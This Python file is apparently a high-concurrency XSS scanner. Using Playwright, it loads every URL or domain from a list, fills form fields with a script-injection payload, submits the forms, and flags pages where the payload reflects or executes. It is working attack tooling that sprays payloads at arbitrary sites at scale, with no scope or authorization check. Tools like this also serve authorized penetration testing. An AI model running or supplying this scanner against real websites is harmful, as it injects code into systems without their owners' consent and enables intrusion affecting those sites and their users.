import asyncio, os, random, string, time, aiohttp, async_timeout
from typing import List, Set, Optional
from urllib.parse import urlparse

from playwright.async_api import async_playwright, Page, Browser, Route
from playwright.async_api import TimeoutError as PWTimeout     # navigation timeout
from playwright._impl._errors import TargetClosedError

# ––– CONFIG –––––––––––––––––––––––––––––––––––––––––––––––––––––––
CONCURRENCY          = 128
BROWSERS             = 12
PAGE_TIMEOUT         = 30_000
XSS_WAIT_TIMEOUT     = 30_000
SCREENSHOT_DIR       = "screenshots"
TAKE_SCREENSHOTS     = False
XSS_TOKEN_LEN        = 8
PAYLOAD_TMPL         = '"><script>alert("XSS:%s")</script>'


def make_payload() -> tuple[str, str]:
    token  = ''.join(random.choices(string.ascii_letters + string.digits, k=XSS_TOKEN_LEN))
    return token, PAYLOAD_TMPL % token


async def host_probe(domain: str) -> Optional[str]:
    for host in (f"https://{domain}", f"https://www.{domain}"):
        try:
            async with async_timeout.timeout(5):
                async with aiohttp.ClientSession() as s:
                    async with s.head(host, allow_redirects=True) as r:
                        if r.status < 500:
                            return str(r.url)
        except Exception:
            pass
    return None

async def _discover_forms(page: Page):
    return await page.query_selector_all("form")


async def _extract_form_inputs(form):
    try:
        inputs = await form.query_selector_all(
            "input:not([type='hidden']):not([disabled]):not([readonly]), "
            "textarea:not([disabled]):not([readonly]), "
            "select:not([disabled]):not([readonly])"
        )
    except Exception:
        return [], []
    names = [
        await el.get_attribute("name") or
        await el.get_attribute("id")   or f"idx-{i}"
        for i, el in enumerate(inputs)
    ]
    return inputs, names


async def fuzz_forms(page: Page, console_hits: Set[str]):
    forms = await _discover_forms(page)
    if forms:
        for form in forms:
            inputs, names = await _extract_form_inputs(form)
            if not names:
                continue
            for el, field_label in zip(inputs, names):
                token, payload = make_payload()
                try:
                    await el.fill(payload)
                except (TargetClosedError, Exception):
                    return
                try:
                    await asyncio.gather(
                        form.evaluate("(f)=>{try{f.submit()}catch(e){}}"),
                        page.wait_for_load_state("domcontentloaded",
                                                 timeout=XSS_WAIT_TIMEOUT)
                    )
                except (TargetClosedError, Exception):
                    return

                try:
                    await page.wait_for_load_state("networkidle", timeout=XSS_WAIT_TIMEOUT)
                    html = await page.content()
                except Exception:
                    print(f"{page.url}  FAILED post-submit load-state")
                    return

                if token in console_hits:
                    print(f"[XSS:EXEC] {page.url}  form-field={field_label}")
                elif token in html:
                    print(f"[XSS:REFL] {page.url}  form-field={field_label}")
                break     # inject one field per form
        return

    try:
        inputs = await page.query_selector_all(
            "input:not([type='hidden']):not([disabled]):not([readonly]), "
            "textarea:not([disabled]):not([readonly]), "
            "select:not([disabled]):not([readonly]), "
            "[contenteditable='true']"
        )
    except Exception:
        return

    inputs = inputs[:120]        # safety
    if not inputs:
        return

    for el in inputs:
        await el.focus()
        try:
            await el.type("seed")
            token, payload = make_payload()
            await el.fill(payload)
            await page.keyboard.press("Enter")
        except Exception:
            return

        try:
            await page.wait_for_load_state("networkidle", timeout=XSS_WAIT_TIMEOUT)
            html = await page.content()
        except Exception:
            print(f"{page.url}  FAILED post-type load-state")
            return

        if token in console_hits:
            print(f"[XSS:EXEC] {page.url}")
        elif token in html:
            print(f"[XSS:REFL] {page.url}")
        break


# ---------- worker -----------------------------------------------------------

async def worker(q: asyncio.Queue, browser: Browser, wid: int):
    """
    Pull URLs from *q* until sentinel None.  Each worker keeps one context &
    page alive for its entire lifetime to minimise Playwright overhead.
    """
    ctx = await browser.new_context(
        viewport={"width": 1280, "height": 720},
        locale="en-US",
        ignore_https_errors=True
    )

    await ctx.route(r"**/*.{png,jpg,jpeg,webp,gif,css,woff,woff2}", lambda r: r.abort())

    page: Page = await ctx.new_page()

    # console-token bucket shared per navigation
    console_hits: Set[str] = set()
    page.on("console", lambda msg: _collect_console(msg, console_hits))
    await page.add_init_script("""
        (() => {
          const send = (tag,data) => console.debug(tag+":"+data);
          ['alert','confirm','prompt'].forEach(fn => {
              window[fn] = msg => send('XSS', msg);
          });
        })();
    """)

    while (url := await q.get()) is not None:
        console_hits.clear()
        try:
            await page.goto(url, wait_until="domcontentloaded", timeout=PAGE_TIMEOUT)
            await fuzz_forms(page, console_hits)

            if TAKE_SCREENSHOTS:
                out = os.path.join(SCREENSHOT_DIR, f"{urlparse(url).hostname}.png")
                try:
                    await page.screenshot(path=out, full_page=True)
                except Exception:
                    pass

            print("OK       ", url)
        except PWTimeout:
            print("TIMEOUT  ", url)
        except Exception as e:
            print("ERROR    ", url, e)
        finally:
            q.task_done()

    # await page.close()
    # await ctx.close()


def _collect_console(msg, bucket: Set[str]):
    if msg.type in ("debug", "log") and msg.text.startswith("XSS:"):
        bucket.add(msg.text.split("XSS:")[-1])


# ---------- main -------------------------------------------------------------

async def main():
    os.makedirs(SCREENSHOT_DIR, exist_ok=True)

    # 1) read lines – allow bare domains OR full URLs ------------------------
    raw_lines = [l.strip() for l in open("urls.txt") if l.strip()]
    has_scheme = [l for l in raw_lines if "http" in l]
    bare       = [l for l in raw_lines if "http" not in l]

    # probe bare domains in parallel
    probes = [host_probe(d) for d in bare]  # list[Coroutine]
    probe_results = await asyncio.gather(*probes)  # list[str|None]
    urls = has_scheme + [u for u in probe_results if u]

    if not urls:
        print("No live URLs found.")
        return

    q: asyncio.Queue = asyncio.Queue()
    for u in urls:
        q.put_nowait(u)
    # CONCURRENCY sentinels
    for _ in range(CONCURRENCY):
        q.put_nowait(None)

    async with async_playwright() as pw:
        # spin up browser pool
        browsers: List[Browser] = [
            await pw.chromium.launch(headless=True)
            for _ in range(BROWSERS)
        ]

        workers = [
            asyncio.create_task(worker(q, browsers[i % BROWSERS], i))
            for i in range(CONCURRENCY)
        ]

        print(f"➜ {len(urls)} URLs • {CONCURRENCY} workers • {BROWSERS} browsers…")
        t0 = time.time()
        await asyncio.gather(*workers)
        print(f"✔︎  {len(urls)/(time.time()-t0):.2f} urls/sec")

        await asyncio.gather(*(b.close() for b in browsers))


if __name__ == "__main__":
    asyncio.run(main())
